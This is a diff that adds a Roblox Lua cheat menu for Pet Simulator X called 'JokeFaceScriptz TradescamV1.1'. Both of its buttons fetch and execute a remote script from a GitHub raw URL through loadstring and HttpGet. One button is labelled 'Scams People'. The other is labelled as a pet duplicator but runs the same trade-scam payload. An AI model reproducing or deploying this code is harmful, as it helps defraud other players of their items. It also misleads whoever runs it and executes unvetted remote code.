@@ -1,0 +1,20 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("JokeFaceScriptz TradescamV1.1", "Ocean")
+
+--JokeFaceScript
+local JokeFaceScript = Window:NewTab("JokeFaceScript")
+local JokeFaceScriptSection = JokeFaceScript:NewSection("PetSimX Hacks!")
+
+
+JokeFaceScriptSection:NewButton("TradeScam", "Scams People", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JokeFaceScriptzzz/TradeScamV1.1/main/TradeScam%20V1.1", true))()
+end)
+
+
+local JokeFaceScript = Window:NewTab("JokeFaceScript")
+local JokeFaceScriptSection = JokeFaceScript:NewSection("PetSimX Hacks!")
+
+
+JokeFaceScriptSection:NewButton("Dupe", "Dupe Pets(Bank Needed)", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JokeFaceScriptzzz/TradeScamV1.1/main/TradeScam%20V1.1", true))()
+end)
